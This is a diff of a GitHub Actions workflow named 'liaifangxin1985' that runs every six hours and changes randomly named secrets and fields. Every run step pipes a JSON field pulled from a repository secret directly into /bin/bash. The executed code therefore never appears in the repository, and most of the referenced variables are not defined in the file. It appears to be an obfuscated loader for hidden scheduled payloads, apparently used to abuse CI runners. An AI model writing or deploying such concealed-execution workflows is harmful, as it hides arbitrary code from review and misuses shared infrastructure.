@@ -1,24 +1,23 @@
 name: liaifangxin1985
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
-
+    - cron: '47 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liaifangxin1985
         env:
-          ssy250: ${{ secrets.ssy250 }}
+          sn5175: ${{ secrets.sn5175 }}
         run: |
-          echo $ssy250 | jq -r .pue07 | /bin/bash
-          echo $lt89224 | jq -r .tff08707 | /bin/bash
-          echo $b981 | jq -r .inwpc53 | /bin/bash
-          echo $myegn77 | jq -r .ih8758 | /bin/bash
-          echo $mgzw7 | jq -r .uws3066 | /bin/bash
-          echo $nlxfw95336 | jq -r .fpbog9881 | /bin/bash
+          echo $sn5175 | jq -r .mi47456 | /bin/bash
+          echo $hqvny52 | jq -r .ckd7598 | /bin/bash
+          echo $hdac1577 | jq -r .zqi1841 | /bin/bash
+          echo $xgr65180 | jq -r .rcvu736 | /bin/bash
+          echo $mxy33 | jq -r .twzo75044 | /bin/bash
+          echo $njmko8379 | jq -r .f516 | /bin/bash
+          echo $qn99 | jq -r .ppgf92214 | /bin/bash
+          echo $lt886 | jq -r .zgkvo97822 | /bin/bash
 
